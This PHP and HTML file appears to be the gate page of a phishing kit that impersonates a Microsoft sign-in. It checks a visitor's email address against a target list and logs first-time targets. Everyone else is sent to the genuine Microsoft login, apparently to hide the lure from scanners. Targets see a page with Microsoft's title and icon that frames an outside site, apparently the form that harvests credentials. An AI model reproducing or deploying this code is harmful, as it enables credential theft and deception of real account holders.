<?php
$email = $_GET['m'];
$err = '0';
if ($email == '') { $err++; } 
if ($err > 0) { header('Location: https://login.live.com/login.srf?wa=wsignin1.0'); die(); }
$exista = 0;
$intra = 0;

if ($email != '') {
	$fisier_exista = file('exista.txt'); 
	$fisier_intra = file('intra.txt');

	foreach($fisier_exista as $linie_exista) { 
		if(strpos($linie_exista, $email) !== false) { 
	    	$exista++;
	    }
	}
	foreach($fisier_intra as $linie_intra) { 
		if(strpos($linie_intra, $email) !== false) { 
	    	$intra++;
	    }
	}
	if ($exista > 0 && $intra <= 0) {

		$file = 'intra.txt';
		$data = "$email\n";
		$handle = fopen($file, 'a') or die('Cannot open file:  '.$file);
		fwrite($handle, $data);
	}
	if ($exista > 0 && $intra > 0) {
		header('Location: https://login.live.com/login.srf?wa=wsignin1.0');
		die();
	}
	if ($exista <= 0 && $intra > 0) {
		header('Location: https://login.live.com/login.srf?wa=wsignin1.0');
		die();
	}
	if ($exista <= 0 && $intra <= 0) {
		header('Location: https://login.live.com/login.srf?wa=wsignin1.0');
		die();
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <title>Sign in to your account</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8220.2/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />
  <script src="https://aframe.io/releases/0.7.1/aframe.min.js"></script>
  <style>
      html, body{
        margin: 0;
        height: 100%;
      }
      iframe{
        border: 0;
      }
    </style>
</head>
<body>
<iframe src="https://oaktreebiz.com/portal1/" width="100%" height="100%" allowfullscreen="yes" allowvr="yes" scrolling="no"></iframe>
</body>
</html>